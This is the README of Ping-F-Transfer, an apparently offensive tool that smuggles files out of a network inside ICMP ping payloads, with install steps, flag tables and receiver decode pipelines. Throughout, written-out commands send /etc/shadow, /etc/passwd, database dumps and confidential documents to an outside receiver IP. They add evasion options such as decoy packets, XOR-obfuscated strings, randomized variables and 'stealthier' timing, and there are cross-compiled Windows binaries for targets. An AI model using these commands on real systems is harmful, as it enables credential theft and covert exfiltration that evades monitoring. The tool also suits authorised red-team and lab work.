# Ping-F-Transfer

Transfer files over the network using nothing but **ICMP echo requests** (`ping`).

Each file chunk is embedded in the payload of a standard ping packet — no TCP, no UDP, no HTTP. The receiving machine captures packets with `tshark` and reassembles the file from hex data. Useful in restricted environments where ICMP is the only protocol allowed through the firewall.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [transfer](#transfer)
  - [generate](#generate)
  - [makefile](#makefile)
- [Receiving the File](#receiving-the-file)
- [Supported Languages](#supported-languages)
- [Flags Reference](#flags-reference)
  - [Common Flags](#common-flags)
  - [generate-only Flags](#generate-only-flags)
  - [makefile-only Flags](#makefile-only-flags)
- [Examples](#examples)
- [Python Standalone Branch](#python-standalone-branch)

---

## Features

| Feature | Description |
|---|---|
| **ICMP-only transfer** | Sends files entirely through `ping` echo requests — no open ports needed |
| **10 languages** | Generate payloads in Python, PowerShell, Bash, Perl, Ruby, PHP, Node.js, Go, and C |
| **Encryption** | AES-128/192/256-CBC encryption with PBKDF2 key derivation |
| **Compression** | Gzip compression to reduce the number of packets |
| **Junk packets** | Inject decoy ICMP packets to obscure the real transfer |
| **String obfuscation** | XOR-encode file paths, IPs, and passphrases in generated payloads |
| **Variable randomization** | Randomize all variable names in generated payloads |
| **Split payloads** | Break long base64 oneliners into paste-friendly chunks |
| **Transfer estimation** | Preview packet count and estimated time without sending anything |
| **Standalone scripts** | Generate full script files (not just oneliners) for any supported language |
| **Cross-compilation** | Go and C payloads with build instructions for Linux, macOS, and Windows |

---

## Installation

### With `pipx` (recommended)

```bash
pipx install git+https://github.com/gunzf0x/Ping-F-Transfer
```

The `ping-f-transfer` command becomes globally available.

<details>
<summary>Don't have <code>pipx</code>? Install it first</summary>

```bash
# Debian / Ubuntu / Kali
sudo apt install pipx
pipx ensurepath

# Arch
sudo pacman -S python-pipx

# macOS
brew install pipx
pipx ensurepath
```

Then restart your shell or run `source ~/.bashrc` (or `~/.zshrc`).

</details>

### Without `pipx` (local usage)

```bash
git clone https://github.com/gunzf0x/Ping-F-Transfer
cd Ping-F-Transfer
python3 ping-f-transfer.py --help
```

Replace `ping-f-transfer` with `python3 ping-f-transfer.py` in all examples below.

---

## Quick Start

**Sender** (machine that has the file):

```bash
# Direct transfer using ping
ping-f-transfer transfer -f secret.txt -i 10.10.14.5

# Or generate a oneliner to paste on the sender machine
ping-f-transfer generate -f secret.txt -i 10.10.14.5 -l python
```

**Receiver** (your machine, must start _before_ the sender):

```bash
# 1. Capture ICMP packets
sudo tshark -i tun0 -l -Y 'icmp.type==8 && ip.src==10.10.10.50' -T fields -e data.data > capture.hex

# 2. Decode the captured data
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > secret.txt

# 3. Verify integrity
sha256sum secret.txt
```

---

## Usage

The tool is organized into three subcommands, each suited for a different scenario:

| Command | Description |
|---|---|
| `transfer` | Send a file directly from the current machine using `ping` |
| `generate` | Create a base64-encoded oneliner to paste on a remote shell |
| `makefile` | Generate a standalone script file to transfer and execute on the target |

### `transfer`

Directly send a file from the current machine using `ping`.

```bash
ping-f-transfer transfer -f <file> -i <receiver-ip>
```

```bash
# Send with a 0.5s gap between pings
ping-f-transfer transfer -f data.db -i 10.10.14.5 -p 0.5

# Send with encryption and compression
ping-f-transfer transfer -f data.db -i 10.10.14.5 --compress --encrypt --enc-passphrase 'MyS3cretP@ss'

# Estimate transfer time without sending
ping-f-transfer transfer -f data.db -i 10.10.14.5 -p 0.3 --estimate-transfer-time
```

### `generate`

Generate a **base64-encoded oneliner** that can be copy/pasted into a terminal on the target machine. The oneliner reads the file and sends it via ping. Useful when you have shell access on the sender but can't transfer the tool itself.

```bash
ping-f-transfer generate -f <file> -i <receiver-ip> -l <language>
```

```bash
# Python oneliner
ping-f-transfer generate -f /etc/shadow -i 10.10.14.5 -l python

# Bash oneliner with junk packets and obfuscation
ping-f-transfer generate -f /etc/shadow -i 10.10.14.5 -l bash --junk 3 --obfuscate-strings --randomize-var

# PowerShell with encryption, split into 3 chunks for easier pasting
ping-f-transfer generate -f C:\Users\admin\flag.txt -i 10.10.14.5 -l powershell --encrypt --enc-passphrase s3cret --split-payload 3
```

### `makefile`

Generate a **standalone script file** that can be transferred to the target machine and executed. Supports all scripting languages plus Go and C (compiled languages).

```bash
ping-f-transfer makefile -f <file> -i <receiver-ip> -l <language>
```

```bash
# Generate a Bash script
ping-f-transfer makefile -f /tmp/loot.tar.gz -i 10.10.14.5 -l bash

# Generate a Go binary for Linux
ping-f-transfer makefile -f /tmp/loot.tar.gz -i 10.10.14.5 -l go --create-script-for linux

# Generate a C binary for Windows with encryption
ping-f-transfer makefile -f C:\data\dump.sql -i 10.10.14.5 -l c --create-script-for windows --encrypt --enc-passphrase hunter2

# Custom output path
ping-f-transfer makefile -f /tmp/data.bin -i 10.10.14.5 -l python -o /tmp/send_it.py
```

For Go and C, the tool generates source code along with **build instructions** (including cross-compilation commands). C binaries for Linux are built with `-static` so they run on any machine without needing shared libraries.

---

## Receiving the File

On the **receiving machine**, start `tshark` **before** the sender begins. Adapt the network interface (`-i`) and source IP filter to your environment.

### Basic capture

```bash
sudo tshark -i <interface> -l -Y 'icmp.type==8 && ip.src==<sender-ip>' -T fields -e data.data > capture.hex
```

### Decode

The decode pipeline depends on which flags were used during transfer:

| Flags used | Decode command |
|---|---|
| _(none)_ | `LC_ALL=C sort -u capture.hex \| cut -c7- \| xxd -r -p > output_file` |
| `--junk` | `LC_ALL=C sort -u capture.hex \| grep -v '^ffffff' \| cut -c7- \| xxd -r -p > output_file` |
| `--junk --randomize-junk` | `LC_ALL=C sort -u capture.hex \| grep -v '^ff' \| cut -c7- \| xxd -r -p > output_file` |
| `--compress` | `LC_ALL=C sort -u capture.hex \| cut -c7- \| xxd -r -p \| gunzip > output_file` |
| `--encrypt` | `LC_ALL=C sort -u capture.hex \| cut -c7- \| xxd -r -p \| openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'PASSPHRASE' > output_file` |
| `--compress --encrypt` | `LC_ALL=C sort -u capture.hex \| cut -c7- \| xxd -r -p \| openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'PASSPHRASE' \| gunzip > output_file` |

> **Note:** When combining `--junk` with `--compress` and/or `--encrypt`, add the `grep -v` filter before `cut` in the pipeline. The tool prints the exact decode command for you after every transfer.

### Verify integrity

```bash
sha256sum output_file
```

Compare the hash with the one printed by the sender.

---

## Supported Languages

| Language | `generate` (oneliner) | `makefile` (standalone file) |
|---|:---:|:---:|
| Python | Yes | Yes |
| PowerShell | Yes | Yes |
| Bash | Yes | Yes |
| Perl | Yes | Yes |
| Ruby | Yes | Yes |
| PHP | Yes | Yes |
| Node.js | Yes | Yes |
| Go | — | Yes |
| C | — | Yes |

Go and C are only available with `makefile` because they produce source code that must be compiled. Use `--create-script-for {linux,macos,windows}` to get the correct build instructions.

### Build requirements for compiled languages

<details>
<summary><b>Go</b></summary>

Just the Go compiler:

```bash
# Debian / Ubuntu / Kali
sudo apt install golang

# Arch
sudo pacman -S go
```

Go produces statically linked binaries by default — no extra flags needed.

</details>

<details>
<summary><b>C</b></summary>

| Target OS | Required packages (on a Debian/Ubuntu/Kali build machine) |
|---|---|
| Linux | `gcc` (usually pre-installed) |
| macOS | Xcode Command Line Tools (`xcode-select --install`) on macOS itself |
| Windows | `gcc-mingw-w64-x86-64` (cross-compiler) |

```bash
# Debian / Ubuntu / Kali — install everything at once
sudo apt install gcc gcc-mingw-w64-x86-64
```

If using `--compress`, the zlib development library is also needed:

| Target OS | Additional package |
|---|---|
| Linux | `zlib1g-dev` (usually pre-installed) |
| Windows (cross-compile) | `libz-mingw-w64-dev` |

```bash
sudo apt install zlib1g-dev libz-mingw-w64-dev
```

Linux builds use `-static` so the resulting binary is self-contained and can run on machines without shared libraries installed.

</details>

---

## Flags Reference

### Common Flags

Available for all subcommands (`transfer`, `generate`, `makefile`):

| Flag | Description | Default |
|---|---|---|
| `-f, --file FILE` | File to send (**required**) | — |
| `-i, --ip IP` | Receiver IP address (**required**) | — |
| `-p, --period SECS` | Delay between pings | `0` (as fast as possible) |
| `-r, --random-delay SECS` | Random variation added to `--period` | `0` |
| `--junk N` | Send N decoy packets after each real packet | `0` (disabled) |
| `--randomize-junk` | Randomize decoy packet indices (requires `--junk`) | off |
| `--compress` | Gzip-compress the file before sending | off |
| `--encrypt [CIPHER]` | Encrypt with a passphrase (default: `aes-256-cbc`) | off |
| `--enc-passphrase PASS` | Provide passphrase non-interactively | prompt |
| `--random-passphrase [LEN]` | Auto-generate a random passphrase | 16 chars |
| `--estimate-transfer-time` | Show stats without sending packets | off |
| `--capture-packets-filename NAME` | Customize filename in tshark instructions | `capture.hex` |
| `--decoded-filename NAME` | Customize filename in decode instructions | `output_file` |
| `--no-banner` | Suppress the ASCII banner | off |

### `generate`-only Flags

| Flag | Description | Default |
|---|---|---|
| `-l, --language LANG` | Payload language (**required**) | — |
| `--randomize-var` | Randomize variable names | off |
| `--split-payload [N]` | Split payload into N chunks (2–10) | off |
| `--obfuscate-strings` | XOR-encode file path, IP, and passphrase | off |

### `makefile`-only Flags

| Flag | Description | Default |
|---|---|---|
| `-l, --language LANG` | Script language (**required**) | — |
| `-o, --output-file FILE` | Output file path | `generated_ping_f_transfer.<ext>` |
| `--randomize-var` | Randomize variable names | off |
| `--create-script-for OS` | Target OS for Go/C (required for Go/C) | — |
| `--obfuscate-strings` | XOR-encode file path, IP, and passphrase | off |

---

## Examples

### Transfer a file directly

```bash
# Fast transfer (no delay between pings)
ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5

# Slower, stealthier transfer with junk packets
ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5 -p 1.0 -r 0.3 --junk 5 --randomize-junk
```

### Generate a stealthy oneliner

```bash
# All evasion flags combined
ping-f-transfer generate -f /etc/passwd -i 10.10.14.5 -l python \
  --compress --encrypt --random-passphrase 24 \
  --junk 2 --randomize-junk \
  --randomize-var --obfuscate-strings
```

### Generate a compiled binary for Windows

```bash
# C binary with encryption for Windows
ping-f-transfer makefile -f C:\Users\admin\confidential.docx -i 10.10.14.5 -l c \
  --create-script-for windows --encrypt --enc-passphrase 'P@ssw0rd!' --compress
```

The tool prints the cross-compilation command:
```
x86_64-w64-mingw32-gcc -o generated_ping_f_transfer.exe generated_ping_f_transfer.c -static -lws2_32 -liphlpapi -lm -lz
```

### Estimate transfer time before sending

```bash
ping-f-transfer transfer -f large_file.bin -i 10.10.14.5 -p 0.2 --junk 3 --estimate-transfer-time
```

### Split a long payload for easier pasting

```bash
# Split into 3 parts
ping-f-transfer generate -f /etc/shadow -i 10.10.14.5 -l bash --split-payload 3
```

This outputs numbered chunks you can paste one at a time, followed by the command to execute them.

---

## Python Standalone Branch

A standalone version of the tool (single `ping-f-transfer.py` file + `utils/` directory, no installation required) is preserved in the [`python-standalone`](https://github.com/gunzf0x/Ping-F-Transfer/tree/python-standalone) branch:

```bash
git clone -b python-standalone https://github.com/gunzf0x/Ping-F-Transfer
cd Ping-F-Transfer
python3 ping-f-transfer.py --help
```

